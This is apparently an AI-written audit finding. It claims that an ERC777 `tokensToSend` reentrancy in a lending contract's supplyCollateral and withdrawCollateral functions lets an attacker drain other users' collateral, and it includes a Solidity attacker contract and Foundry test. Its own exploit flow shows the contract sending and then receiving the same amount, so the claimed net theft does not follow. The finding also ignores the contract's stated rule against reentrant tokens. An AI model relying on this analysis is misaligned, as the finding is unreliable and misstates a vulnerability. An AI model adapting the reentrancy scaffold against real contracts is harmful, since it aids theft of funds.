Let me read the `SafeTransferLib.sol` and check for any reentrancy guards in the contract.

### Title
ERC777 `tokensToSend` Reentrancy in `supplyCollateral` Allows Draining Other Users' Collateral - (`src/Midnight.sol` / `src/libraries/SafeTransferLib.sol`)

### Summary

`supplyCollateral` writes the borrower's collateral storage and sets the bitmap bit **before** calling `safeTransferFrom`. For an ERC777 collateral token, the ERC777 `tokensToSend` hook fires on the sender before the transfer completes, allowing the attacker to reenter `withdrawCollateral`, which sees the already-updated storage, passes the health check (no debt), and transfers tokens from Midnight's **existing** balance. The original `safeTransferFrom` then completes, depositing tokens with no corresponding storage entry, netting the attacker a free withdrawal of `assets` tokens stolen from other users' collateral.

### Finding Description

**Exact code path:**

`supplyCollateral` (`src/Midnight.sol` lines 524–546):

```
_position.collateral[collateralIndex] = oldCollateral + assets;   // (1) state written
_position.collateralBitmap = _position.collateralBitmap.setBit(…); // (2) bitmap set
SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets); // (3) transfer last
``` [1](#0-0) 

`SafeTransferLib.safeTransferFrom` issues a raw `token.call(transferFrom(...))` with no reentrancy guard: [2](#0-1) 

`withdrawCollateral` (`src/Midnight.sol` lines 549–573):

```
_position.collateral[collateralIndex] = newCollateral;  // (A) state decremented
_position.collateralBitmap = clearBit(…);               // (B) bitmap cleared if zero
require(isHealthy(…));                                  // (C) health check
SafeTransferLib.safeTransfer(collateralToken, receiver, assets); // (D) transfer out
``` [3](#0-2) 

`isHealthy` short-circuits to `true` when `debt == 0`: [4](#0-3) 

**Exploit flow (attacker has no debt, Midnight holds ≥ `assets` of the ERC777 token from other users):**

1. Attacker calls `supplyCollateral(market, idx, assets, attacker)`.
2. Steps (1)+(2): `_position.collateral[idx]` = `assets`, bitmap bit set.
3. Step (3): `safeTransferFrom` calls `token.transferFrom(attacker, midnight, assets)`.
4. ERC777 fires `tokensToSend(attacker, attacker, midnight, assets)` on attacker's registered hook — **before** tokens move.
5. Hook calls `withdrawCollateral(market, idx, assets, attacker, attacker)`.
6. Steps (A)+(B): `_position.collateral[idx]` = 0, bitmap cleared.
7. Step (C): `isHealthy` → debt == 0 → `true`.
8. Step (D): `safeTransfer(token, attacker, assets)` — Midnight sends `assets` tokens **from its existing balance** (other users' collateral) to attacker.
9. Reentrancy returns; original `transferFrom` completes — `assets` tokens move from attacker to Midnight.

**Net:** attacker's token balance unchanged (received in step 8, sent in step 9), but Midnight's balance is down by `assets`. Attacker's `_position.collateral[idx]` = 0. Other users' collateral is stolen.

**Why existing checks fail:**

- There is no `nonReentrant` modifier or global reentrancy lock on `supplyCollateral` or `withdrawCollateral`. The `LIQUIDATION_LOCK_SLOT` / `tExchange` mechanism is used only inside `take`. [5](#0-4) 
- The TOKEN SAFETY REQUIREMENTS section (lines 133–140) documents "It should not re-enter Midnight on transfer nor transferFrom" as an **assumption**, not an enforced invariant. [6](#0-5) 
- The authorization check `onBehalf == msg.sender` passes because the attacker acts on their own behalf in both calls.
- The health check passes because the attacker has zero debt.

### Impact Explanation

Midnight's token balance for the ERC777 collateral token decreases by `assets` per attack iteration, directly stealing from other users' deposited collateral. The solvency invariant — "contract balances cover collateral, credit redemption, fees, and withdrawable assets" — is broken. The attack is repeatable until Midnight's balance of that token is drained. [7](#0-6) 

### Likelihood Explanation

**Preconditions:**
1. A market must be created with an ERC777-compatible token as a collateral token. ERC777 is ERC20-backward-compatible; nothing in the protocol prevents it.
2. Midnight must hold a non-zero balance of that token (i.e., at least one other user has supplied it as collateral).
3. The attacker must hold `assets` of the token and register a `tokensToSend` hook via the ERC1820 registry — a standard, permissionless ERC777 operation.

The attack is fully repeatable in a loop and requires no privileged access, no oracle manipulation, and no user mistake.

### Recommendation

Move `safeTransferFrom` **before** any state writes in `supplyCollateral`, following the checks-effects-interactions pattern:

```solidity
// 1. Transfer first
SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets);
// 2. Then update state
_position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + assets);
if (oldCollateral == 0 && assets > 0) { … setBit … }
```

Alternatively, add a per-function or global reentrancy lock (e.g., transient storage guard) covering both `supplyCollateral` and `withdrawCollateral`. The existing `LIQUIDATION_LOCK_SLOT` / `tExchange` pattern could be extended for this purpose. [8](#0-7) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {IERC1820Registry} from "...";

contract ERC777AttackToken is ERC777 { /* standard ERC777 */ }

contract AttackerHook is IERC777Sender {
    Midnight midnight;
    Market market;
    uint256 collateralIndex;
    uint256 assets;
    bool attacking;

    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        if (attacking) {
            attacking = false;
            // Reentrant call: collateral storage already set, bitmap already set, no debt
            midnight.withdrawCollateral(market, collateralIndex, assets, address(this), address(this));
        }
    }

    function attack() external {
        attacking = true;
        // This triggers tokensToSend before transfer completes
        midnight.supplyCollateral(market, collateralIndex, assets, address(this));
    }
}

contract ERC777ReentrancyTest is Test {
    function testDrainCollateral() public {
        // Setup: victim supplies 1000e18 ERC777 tokens as collateral
        // Attacker holds 100e18 ERC777 tokens
        uint256 victimDeposit = 1000e18;
        uint256 attackAssets = 100e18;

        // ... setup market, victim deposits, attacker registers hook ...

        uint256 midnightBalanceBefore = token.balanceOf(address(midnight));
        uint256 attackerBalanceBefore = token.balanceOf(attacker);

        vm.prank(attacker);
        attackerHook.attack();

        // Assertions:
        assertEq(token.balanceOf(address(midnight)), midnightBalanceBefore - attackAssets,
            "Midnight lost tokens");
        assertEq(token.balanceOf(attacker), attackerBalanceBefore, // net unchanged (sent and received same amount)
            "Attacker balance unchanged (tokens stolen from others)");
        assertEq(midnight.collateral(id, attacker, collateralIndex), 0,
            "Attacker has zero collateral storage");
        // Invariant violation: midnight balance < sum of all deposited collateral
    }
}
```

### Citations

**File:** src/Midnight.sol (L133-140)
```text
/// TOKEN SAFETY REQUIREMENTS
/// @dev List of assumptions on tokens that guarantee that Midnight behaves as expected:
/// - It should be ERC-20 compliant, except that it can omit return values on transfer and transferFrom. In particular,
/// it should not revert because a transfer is no-op.
/// - Midnight's balance of the token should only decrease on transfer and transferFrom.
/// - It should not re-enter Midnight on transfer nor transferFrom.
/// - Midnight must send/receive exactly the requested amount on transfers.
/// @dev See LIVENESS for liveness guarantees.
```

**File:** src/Midnight.sol (L444-475)
```text
        bool wasLocked = UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, true);
        if (buyerCallback != address(0)) {
            bytes memory buyerCallbackData = offer.buy ? offer.callbackData : takerCallbackData;
            require(
                IBuyCallback(buyerCallback)
                    .onBuy(id, offer.market, buyerAssets, units, buyerPendingFeeIncrease, buyer, buyerCallbackData)
                == CALLBACK_SUCCESS,
                WrongBuyCallbackReturnValue()
            );
        }

        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);

        if (sellerCallback != address(0)) {
            bytes memory sellerCallbackData = offer.buy ? takerCallbackData : offer.callbackData;
            require(
                ISellCallback(sellerCallback)
                    .onSell(
                        id,
                        offer.market,
                        sellerAssets,
                        units,
                        sellerPendingFeeDecrease,
                        seller,
                        receiver,
                        sellerCallbackData
                    ) == CALLBACK_SUCCESS,
                WrongSellCallbackReturnValue()
            );
        }
        if (!wasLocked) UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, false);
```

**File:** src/Midnight.sol (L524-546)
```text
    function supplyCollateral(Market memory market, uint256 collateralIndex, uint256 assets, address onBehalf)
        external
    {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);
        address collateralToken = market.collateralParams[collateralIndex].token;

        Position storage _position = position[id][onBehalf];
        uint256 oldCollateral = _position.collateral[collateralIndex];
        _position.collateral[collateralIndex] = UtilsLib.toUint128(oldCollateral + assets);

        if (oldCollateral == 0 && assets > 0) {
            uint128 newCollateralBitmap = _position.collateralBitmap.setBit(collateralIndex);
            _position.collateralBitmap = newCollateralBitmap;
            require(
                UtilsLib.countBits(newCollateralBitmap) <= MAX_COLLATERALS_PER_BORROWER, TooManyActivatedCollaterals()
            );
        }

        emit EventsLib.SupplyCollateral(msg.sender, id, collateralToken, assets, onBehalf);

        SafeTransferLib.safeTransferFrom(collateralToken, msg.sender, address(this), assets);
    }
```

**File:** src/Midnight.sol (L560-572)
```text
        Position storage _position = position[id][onBehalf];
        uint256 newCollateral = _position.collateral[collateralIndex] - assets;
        _position.collateral[collateralIndex] = UtilsLib.toUint128(newCollateral);

        if (newCollateral == 0 && assets > 0) {
            _position.collateralBitmap = _position.collateralBitmap.clearBit(collateralIndex);
        }

        require(isHealthy(market, id, onBehalf), UnhealthyBorrower());

        emit EventsLib.WithdrawCollateral(msg.sender, id, collateralToken, assets, onBehalf, receiver);

        SafeTransferLib.safeTransfer(collateralToken, receiver, assets);
```

**File:** src/Midnight.sol (L944-959)
```text
    function isHealthy(Market memory market, bytes32 id, address borrower) public view returns (bool) {
        Position storage _position = position[id][borrower];
        uint256 debt = _position.debt;
        uint256 maxDebt;
        if (debt > 0) {
            uint128 _collateralBitmap = _position.collateralBitmap;
            while (_collateralBitmap != 0) {
                uint256 i = UtilsLib.msb(_collateralBitmap);
                CollateralParams memory collateralParam = market.collateralParams[i];
                uint256 price = IOracle(collateralParam.oracle).price();
                maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
                    .mulDivDown(collateralParam.lltv, WAD);
                _collateralBitmap = _collateralBitmap.clearBit(i);
            }
        }
        return maxDebt >= debt;
```

**File:** src/libraries/SafeTransferLib.sol (L24-34)
```text
    function safeTransferFrom(address token, address from, address to, uint256 value) internal {
        require(token.code.length > 0, NoCode());

        (bool success, bytes memory returndata) = token.call(abi.encodeCall(IERC20.transferFrom, (from, to, value)));
        if (!success) {
            assembly ("memory-safe") {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }
        require(returndata.length == 0 || abi.decode(returndata, (bool)), TransferFromReturnedFalse());
    }
```

**File:** certora/README.md (L74-82)
```markdown
## Token transfers

Value cannot leak to unauthorized parties.

- [`Solvency.spec`](specs/Solvency.spec) checks the central solvency invariant: for every token, the contract's balance always covers the sum of collateral, withdrawable and claimable settlement fees.
- [`OnlyExplicitPayerCanLoseTokens.spec`](specs/OnlyExplicitPayerCanLoseTokens.spec) checks that tokens are only ever pulled from an explicit payer.
  In `take`, the payer can only be the `buyerCallback` if it is passed, otherwise it is either the maker for a buy offer, or `msg.sender` for a sell offer.
  In every other entry point, the payer is `msg.sender` or the corresponding callback.

```
